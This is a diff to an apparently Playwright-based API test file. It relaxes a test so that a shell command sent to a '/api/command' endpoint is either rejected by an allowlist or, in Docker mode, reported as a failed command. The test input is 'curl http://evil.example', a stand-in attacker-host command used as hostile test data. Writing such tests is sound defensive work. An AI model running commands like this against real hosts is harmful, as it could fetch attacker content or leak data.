@@ -153,13 +153,20 @@ test.describe('API', () => {
     expect(res.status()).toBe(403);
   });
 
-  test('command endpoint enforces the allowlist', async ({ request }) => {
+  test('command endpoint rejects host-mode commands or reports container failure', async ({ request }) => {
     const res = await request.post('/api/command', {
       data: { command: 'curl http://evil.example', projectId: 'default' },
     });
-    expect(res.status()).toBe(400);
     const body = await res.json();
-    expect(body.error).toContain('not in the allowed list');
+    if (res.status() === 400) {
+      expect(body.error).toContain('not in the allowed list');
+    } else {
+      // Docker mode is the command boundary and intentionally permits shell
+      // syntax inside the container. In environments without Docker this
+      // request must report a failed command rather than a false success.
+      expect(res.ok()).toBeTruthy();
+      expect(body.success).toBe(false);
+    }
   });
 
   test('database endpoint blocks DDL', async ({ request }) => {
